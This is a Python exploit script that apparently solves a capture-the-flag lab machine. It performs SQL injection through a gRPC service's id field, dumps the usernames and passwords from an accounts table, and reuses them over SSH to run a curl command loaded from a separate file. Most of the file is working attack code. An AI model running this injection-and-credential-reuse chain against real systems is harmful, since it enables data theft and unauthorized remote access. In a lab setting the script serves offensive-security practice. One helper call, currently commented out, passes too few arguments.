import grpc
import SimpleApp_pb2_grpc as pb2_grpc
import SimpleApp_pb2 as pb2
import json
import paramiko

host = "10.10.11.214"
grpc_port = 50051

def main():
    stub = setup_grpc()
    users = get_users(stub)
    
    # get_user_flag()
    get_root_flag(users)

def get_users(stub):
    user = pb2.LoginUserRequest(username="admin", password="admin")
    response, call = stub.LoginUser.with_call(user)
    metadata = call.trailing_metadata()
    token = metadata[0].value[2:-1]

    query = "62 UNION SELECT name FROM sqlite_master where type='table'"
    table = make_get_id_req(token, query, stub)

    query = f"62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info('{table}')"
    cols = make_get_id_req(token, query, stub)

    res = []
    for col in cols.split(","):
        query = f"62 UNION SELECT GROUP_CONCAT({col}) FROM accounts"
        r = make_get_id_req(token, query, stub)
        res.append(r.split(','))

    usernames = res[0]
    passwords = res[1]

    users = []
    for i in range(len(usernames)):
        users.append({"username":usernames[i], "password":passwords[i]})
        
    return users

def get_user_flag():
    print(ssh_exec_command("cat user.txt"))

def get_root_flag(users):
    curl_cmd = read_curl_command()
    ssh_exec_command(curl_cmd, users)

def make_get_id_req(token, query, stub):
    metadata = (('token',token),)
    id_request = pb2.getInfoRequest(id=query)
    r = stub.getInfo.with_call(id_request, metadata=metadata)
    return(r[0].message)

def setup_grpc():
    channel = grpc.insecure_channel(f"{host}:{grpc_port}")
    stub = pb2_grpc.SimpleAppStub(channel)
    
    return stub

def ssh_exec_command(command, users):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for user in users:
        try:
            client.connect(host, username=user["username"], password=user["password"])
            ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command(command)

            return ssh_stdout.read().decode('utf-8')

        except paramiko.ssh_exception.AuthenticationException:
            continue


def read_curl_command():
    with open("../curl.txt") as f:
        return f.read().strip()

if __name__ == "__main__":
    main()
